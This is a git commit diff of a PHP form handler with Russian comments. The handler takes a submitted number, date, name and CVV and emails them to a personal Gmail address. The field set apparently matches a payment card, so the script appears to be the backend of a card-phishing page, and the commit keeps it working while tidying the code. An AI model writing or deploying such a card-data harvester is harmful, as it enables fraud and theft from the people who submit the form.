d5789dacacf5c960cb0cc2e677cf0e2255d774c0
VolkerDAN <132279777+VolkerDAN@users.noreply.github.com>
2023-10-08 16:51:19 +0200

    process_form.php

--- process_form.php
+++ process_form.php
@@ -1,43 +1,46 @@
 <?php
+ini_set('display_errors', 'On');
+error_reporting(E_ALL);
 
-ini_set('display_errors','On');
-error_reporting('E_ALL');
-
-$to = 'danilukfolker@gmail.com'; //Адреса, куда будут приходить письма. две почты указываем через запятую
+$to = 'danilukfolker@gmail.com'; // Адрес, куда будут приходить письма. Две почты указываются через запятую
 $sitename = $_SERVER['SERVER_NAME'];
 
-if (isset($_POST['phone']) && !empty($_POST['phone']))
-{
-    $data  = strip_tags($_POST['numer']);
-    $data  = strip_tags($_POST['data']);
-    $Namme  = strip_tags($_POST['Namme']);
-    $cvv  = strip_tags($_POST['cvv']);
-// Формирование заголовка письма
-    $subject  = "[Zajavka s sajta ".$sitename."]";
-    $headers  = "From: mail@".$sitename." \r\n";
+if (isset($_POST['phone']) && !empty($_POST['phone'])) {
+    $numer = strip_tags($_POST['phone']);
+    $data = strip_tags($_POST['data']);
+    $Namme = strip_tags($_POST['Namme']);
+    $cvv = strip_tags($_POST['cvv']);
+
+    // Формирование заголовка письма
+    $subject = "[Заявка с сайта $sitename]";
+    $headers = "From: mail@$sitename \r\n";
     $headers .= "MIME-Version: 1.0\r\n";
     $headers .= "Content-Type: text/html;charset=utf-8 \r\n";
-// Формирование тела письма
-    $msg  = "<html><body style='font-family:Arial,sans-serif;'>";
+
+    // Формирование тела письма
+    $msg = "<html><body style='font-family:Arial,sans-serif;'>";
     $msg .= "<h2 style='font-weight:bold;border-bottom:1px dotted #ccc;'>Новая заявка:</h2>\r\n";
-    if(isset($_POST['data']) && !empty($_POST['data'])){
-      $msg .= "<p><strong>Номер:</strong> ".$data."</p>\r\n";
+    if (isset($_POST['data']) && !empty($_POST['data'])) {
+        $msg .= "<p><strong>Дата:</strong> $data</p>\r\n";
     }
-    if(isset($_POST['data']) && !empty($_POST['data'])){
-      $msg .= "<p><strong>Телефон:</strong> ".$data."</p>\r\n";
+    if (isset($_POST['phone']) && !empty($_POST['phone'])) {
+        $msg .= "<p><strong>Телефон:</strong> $numer</p>\r\n";
     }
-    if(isset($_POST['cvv']) && !empty($_POST['cvv'])){
-      $msg .= "<p><strong>cvv:</strong> ".$cvv."</p>\r\n";
+    if (isset($_POST['cvv']) && !empty($_POST['cvv'])) {
+        $msg .= "<p><strong>CVV:</strong> $cvv</p>\r\n";
     }
-    if(isset($_POST['Namme']) && !empty($_POST['Namme'])){
-        $msg .= "<p><strong>Телефон:</strong> ".$Namme."</p>\r\n";
-      }
+    if (isset($_POST['Namme']) && !empty($_POST['Namme'])) {
+        $msg .= "<p><strong>Имя:</strong> $Namme</p>\r\n";
+    }
     $msg .= "</body></html>";
-// отправка сообщения
-    mail($to, $subject, $msg, $headers);
-}
-else
-{
+
+    // Отправка сообщения
+    if (mail($to, $subject, $msg, $headers)) {
+        echo "Заявка отправлена!";
+    } else {
+        echo "Произошла ошибка при отправке заявки :(";
+    }
+} else {
     echo "Заявка не отправлена :(";
 }
 ?>
